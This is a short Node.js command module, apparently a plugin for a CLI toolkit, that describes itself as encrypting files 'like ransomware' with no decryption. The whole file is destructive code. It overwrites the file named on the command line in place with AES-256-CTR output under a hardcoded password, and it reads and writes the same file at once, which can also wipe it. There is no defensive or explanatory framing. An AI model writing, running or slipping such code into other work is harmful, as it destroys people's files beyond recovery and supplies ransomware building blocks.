const crypto = require( 'crypto' )
const fs = require( 'fs' )
const path = require( 'path' )

const { join } = path

const algorithm = 'aes-256-ctr'
const password = ':6b%J3)p=.}b;h};.qupG=U+DbZv[w}{'

module.exports = {
  name: 'encrypt-files',
  alias: ['ef'],
  description: 'Encrypt specific files like ransomware ( No decryption! )',
  run: async toolbox => {
    const { parameters } = toolbox
    encryptFile( join(`${process.cwd()}/${parameters.first}`) ) 
  }
}

function encryptFile ( file ) {
  const read = fs.createReadStream( file )
  const write = fs.createWriteStream( file )
  const cipher = crypto.createCipher( algorithm , password )
  read.pipe( cipher ).pipe( write )
}